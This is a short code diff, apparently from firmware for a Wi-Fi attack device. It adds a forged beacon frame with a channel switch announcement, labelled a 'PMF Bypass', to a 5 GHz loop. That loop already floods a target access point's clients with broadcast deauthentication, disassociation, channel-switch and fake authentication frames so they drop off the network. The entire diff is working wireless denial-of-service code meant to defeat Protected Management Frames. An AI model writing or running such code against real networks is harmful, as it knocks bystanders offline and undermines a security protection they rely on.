@@ -602,8 +602,13 @@ void loop() {
                         if (is5GHz) {
                             wifi_tx_deauth_nav(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
                             uint8_t ghost_ch = csa_ghost_channels[csa_ghost_idx % sizeof(csa_ghost_channels)];
+                            
+                            // PMF Bypass: Fake Beacon with CSA/ECSA telling clients to switch to ghost_ch
+                            wifi_tx_beacon_csa_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", scan_results[idx].ssid.c_str(), ghost_ch);
+                            
                             wifi_tx_csa_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ghost_ch);
                             csa_ghost_idx++;
+                            
                             wifi_tx_deauth_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
                             wifi_tx_deauth_frame(rand_mac, bssid, reason);
                             wifi_tx_disassoc_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
@@ -617,7 +622,7 @@ void loop() {
                             wifi_tx_deauth_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
                             wifi_tx_auth_frame(rand_mac, bssid);
 
-                            sent_frames += 11;
+                            sent_frames += 12;
                         } else {
                             wifi_tx_deauth_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
                             wifi_tx_disassoc_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
